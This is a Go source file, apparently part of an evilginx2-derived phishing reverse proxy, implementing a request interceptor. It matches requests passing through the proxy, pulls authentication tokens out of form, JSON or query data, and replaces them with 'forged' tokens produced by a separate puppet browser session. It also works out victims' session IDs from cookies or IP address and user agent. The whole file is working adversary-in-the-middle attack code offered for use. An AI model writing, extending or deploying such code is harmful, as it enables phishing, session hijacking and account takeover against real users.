package core

import (
	"bytes"
	"fmt"
	"io"
	"net"
	"net/http"
	"net/url"
	"regexp"
	"strings"
	"time"

	"github.com/kgretzky/evilginx2/log"
)

// RequestInterceptor intercepts and modifies HTTP requests
type RequestInterceptor struct {
	puppetMaster *PuppetMaster
	triggers     []*PuppetTrigger
	interceptors []*PuppetInterceptor
}

// NewRequestInterceptor creates a new interceptor
func NewRequestInterceptor(pm *PuppetMaster) *RequestInterceptor {
	return &RequestInterceptor{
		puppetMaster: pm,
	}
}

// AddTrigger adds a trigger for interception
func (ri *RequestInterceptor) AddTrigger(trigger *PuppetTrigger) {
	ri.triggers = append(ri.triggers, trigger)
}

// ClearTriggers removes all triggers
func (ri *RequestInterceptor) ClearTriggers() {
	ri.triggers = []*PuppetTrigger{}
}

// AddInterceptor adds an interceptor
func (ri *RequestInterceptor) AddInterceptor(interceptor *PuppetInterceptor) {
	ri.interceptors = append(ri.interceptors, interceptor)
}

// ClearInterceptors removes all interceptors
func (ri *RequestInterceptor) ClearInterceptors() {
	ri.interceptors = []*PuppetInterceptor{}
}

// InterceptRequest intercepts and modifies an HTTP request
func (ri *RequestInterceptor) InterceptRequest(req *http.Request, sessionID string) (*http.Request, bool) {
	if sessionID == "" {
		sessionID = ri.ExtractSessionID(req)
	}

	if sessionID != "" {
		log.Debug("[INTERCEPTOR] Using session ID: %s", sessionID)
	}

	// Check if any trigger matches this request
	for _, trigger := range ri.triggers {
		if ri.matchesTrigger(req, trigger) {
			// Collect all tokens we need to inject
			tokensToInject := []string{}
			if trigger.Token != "" {
				tokensToInject = append(tokensToInject, trigger.Token)
			}
			for _, t := range trigger.Tokens {
				// Don't add if already added by trigger.Token
				exists := false
				for _, et := range tokensToInject {
					if et == t {
						exists = true
						break
					}
				}
				if !exists {
					tokensToInject = append(tokensToInject, t)
				}
			}

			if len(tokensToInject) == 0 {
				log.Debug("[INTERCEPTOR] No tokens specified in trigger %s", trigger.Id)
				continue
			}

			log.Debug("[INTERCEPTOR] Request matches trigger %s, needs tokens: %v", trigger.Id, tokensToInject)

			modifiedReq := req
			anyIntercepted := false

			for _, tokenName := range tokensToInject {
				// Try to get existing token first (fast path)
				puppetToken, exists := ri.puppetMaster.GetToken(sessionID, tokenName)

				// Extract original token from request FIRST
				originalToken, err := ri.extractTokenFromRequest(modifiedReq, tokenName)
				if err != nil {
					// Token not found in request, no need to wait or replace
					continue
				}

				if !exists {
					// Token doesn't exist yet, wait for puppet to complete
					log.Info("[INTERCEPTOR] Token %s found in request but puppet session not ready, waiting...", tokenName)
					token, err := ri.puppetMaster.WaitForToken(sessionID, tokenName, 30*time.Second)
					if err != nil {
						log.Warning("[INTERCEPTOR] Failed to wait for puppet token %s: %v", tokenName, err)
						continue // Try next token if any
					}
					puppetToken = token
				}

				log.Info("[INTERCEPTOR] Replacing token %s... with forged token %s...",
					shortenToken(originalToken),
					shortenToken(puppetToken))

				// Replace token in request
				newReq, err := ri.replaceTokenInRequest(modifiedReq, originalToken, puppetToken)
				if err != nil {
					log.Error("[INTERCEPTOR] Failed to replace token %s: %v", tokenName, err)
					continue
				}
				modifiedReq = newReq
				anyIntercepted = true
			}

			if anyIntercepted {
				// If trigger has abort, we might signal differently, but for now we just log
				if trigger.AbortOriginal {
					log.Debug("[INTERCEPTOR] Trigger configured to abort original request (not fully implemented)")
				}
				log.Success("[INTERCEPTOR] Successfully injected %d tokens into request for trigger %s", len(tokensToInject), trigger.Id)
				return modifiedReq, true
			}
		}
	}

	// 2. Check interceptors
	for _, interceptor := range ri.interceptors {
		if ri.matchesInterceptor(req, interceptor) {
			log.Debug("[INTERCEPTOR] Request matches interceptor for token %s", interceptor.Token)

			// Try to get existing token first (fast path)
			puppetToken, exists := ri.puppetMaster.GetToken(sessionID, interceptor.Token)

			// Extract original token from request FIRST
			originalToken, err := ri.extractTokenFromRequest(req, interceptor.Token)
			if err != nil {
				// Token not found in request, skip
				continue
			}

			if !exists {
				// Token doesn't exist yet, wait for puppet to complete
				log.Info("[INTERCEPTOR] Token %s found in request but puppet session not ready, waiting...", interceptor.Token)
				token, err := ri.puppetMaster.WaitForToken(sessionID, interceptor.Token, 30*time.Second)
				if err != nil {
					log.Warning("[INTERCEPTOR] Failed to wait for puppet token %s: %v", interceptor.Token, err)
					continue
				}
				puppetToken = token
			}
			// If parameter is specified, use it. Otherwise use token name.
			paramName := interceptor.Parameter
			if paramName == "" {
				paramName = interceptor.Token
			}

			originalToken, err = ri.extractTokenFromRequest(req, paramName)
			if err != nil {
				log.Warning("[INTERCEPTOR] Failed to extract token %s from request: %v", paramName, err)
				continue
			}

			log.Info("[INTERCEPTOR] Replacing token %s... with forged token %s... (Interceptor)",
				shortenToken(originalToken),
				shortenToken(puppetToken))

			// Replace token in request
			modifiedReq, err := ri.replaceTokenInRequest(req, originalToken, puppetToken)
			if err != nil {
				log.Error("[INTERCEPTOR] Failed to replace token %s: %v", paramName, err)
				continue
			}

			if interceptor.Abort {
				log.Debug("[INTERCEPTOR] Interceptor configured to abort original request (not fully implemented)")
			}

			log.Success("[INTERCEPTOR] Successfully injected token %s into request (Interceptor)", interceptor.Token)
			return modifiedReq, true
		}
	}

	return req, false
}

// matchesInterceptor checks if request matches an interceptor
func (ri *RequestInterceptor) matchesInterceptor(req *http.Request, interceptor *PuppetInterceptor) bool {
	// Check method if specified
	if interceptor.Method != "" && req.Method != interceptor.Method {
		return false
	}

	// Check URL pattern
	url := req.URL.String()
	if interceptor.UrlPattern != "" {
		matched, _ := regexp.MatchString(interceptor.UrlPattern, url)
		if !matched {
			return false
		}
	}

	return true
}

// matchesTrigger checks if request matches a trigger
func (ri *RequestInterceptor) matchesTrigger(req *http.Request, trigger *PuppetTrigger) bool {
	// Check domain
	host := req.Host
	if host == "" {
		host = req.URL.Host
	}
	
	domainMatch := false
	for _, domain := range trigger.Domains {
		if strings.Contains(host, domain) || domain == "*" {
			domainMatch = true
			break
		}
	}
	
	if !domainMatch {
		return false
	}
	
	// Check path
	pathMatch := false
	path := req.URL.Path
	for _, triggerPath := range trigger.Paths {
		if path == triggerPath || triggerPath == "*" {
			pathMatch = true
			break
		}
		// Support regex paths
		if strings.HasPrefix(triggerPath, "regex:") {
			pattern := strings.TrimPrefix(triggerPath, "regex:")
			if matched, _ := regexp.MatchString(pattern, path); matched {
				pathMatch = true
				break
			}
		}
	}
	
	return domainMatch && pathMatch
}

// extractTokenFromRequest extracts token from request body
func (ri *RequestInterceptor) extractTokenFromRequest(req *http.Request, tokenName string) (string, error) {
	// Read body
	bodyBytes, err := io.ReadAll(req.Body)
	if err != nil {
		return "", err
	}
	
	// Restore body for future reads
	req.Body = io.NopCloser(bytes.NewBuffer(bodyBytes))
	bodyStr := string(bodyBytes)
	
	// Try different extraction methods
	
	// Method 1: Form-encoded
	values, err := url.ParseQuery(bodyStr)
	if err == nil {
		for key, val := range values {
			if strings.Contains(strings.ToLower(key), strings.ToLower(tokenName)) && len(val) > 0 {
				return val[0], nil
			}
		}
	}
	
	// Method 2: JSON encoded
	if strings.Contains(bodyStr, "{") && strings.Contains(bodyStr, "}") {
		// Simple JSON extraction (for production, use proper JSON parser)
		pattern := fmt.Sprintf(`"%s"\s*:\s*"([^"]+)"`, regexp.QuoteMeta(tokenName))
		re := regexp.MustCompile(pattern)
		matches := re.FindStringSubmatch(bodyStr)
		if len(matches) > 1 {
			return matches[1], nil
		}
		
		// Try without quotes
		pattern2 := fmt.Sprintf(`%s["']?\s*[:=]\s*["']?([^"',}&]+)`, regexp.QuoteMeta(tokenName))
		re2 := regexp.MustCompile(pattern2)
		matches2 := re2.FindStringSubmatch(bodyStr)
		if len(matches2) > 1 {
			return matches2[1], nil
		}
	}
	
	// Method 3: URL parameters
	queryValues := req.URL.Query()
	for key, val := range queryValues {
		if strings.Contains(strings.ToLower(key), strings.ToLower(tokenName)) && len(val) > 0 {
			return val[0], nil
		}
	}
	
	return "", fmt.Errorf("token %s not found in request", tokenName)
}

// replaceTokenInRequest replaces token in request body
func (ri *RequestInterceptor) replaceTokenInRequest(req *http.Request, oldToken, newToken string) (*http.Request, error) {
	// Read original body
	bodyBytes, err := io.ReadAll(req.Body)
	if err != nil {
		return nil, err
	}
	
	bodyStr := string(bodyBytes)
	
	// Replace token
	// Handle URL-encoded
	bodyStr = strings.ReplaceAll(bodyStr, url.QueryEscape(oldToken), url.QueryEscape(newToken))
	// Handle raw
	bodyStr = strings.ReplaceAll(bodyStr, oldToken, newToken)
	
	// Create new request with modified body
	newReq := req.Clone(req.Context())
	newReq.Body = io.NopCloser(bytes.NewBufferString(bodyStr))
	newReq.ContentLength = int64(len(bodyStr))
	
	// Update Content-Length header
	newReq.Header.Set("Content-Length", fmt.Sprintf("%d", len(bodyStr)))
	
	return newReq, nil
}

// ExtractSessionID extracts session ID from request/cookies
func (ri *RequestInterceptor) ExtractSessionID(req *http.Request) string {
	// 1. Try to get session ID from cookie (64-character hex only)
	for _, cookie := range req.Cookies() {
		if len(cookie.Value) == 64 {
			return cookie.Value
		}
	}

	// Try from URL parameter
	sessionID := req.URL.Query().Get("session")
	if sessionID != "" {
		return sessionID
	}

	// Generate from IP + User-Agent as fallback
	// IMPORTANT: Strip port from RemoteAddr
	ip, _, err := net.SplitHostPort(req.RemoteAddr)
	if err != nil {
		ip = req.RemoteAddr
	}
	ua := req.UserAgent()
	return fmt.Sprintf("%s_%s", ip, ua)
}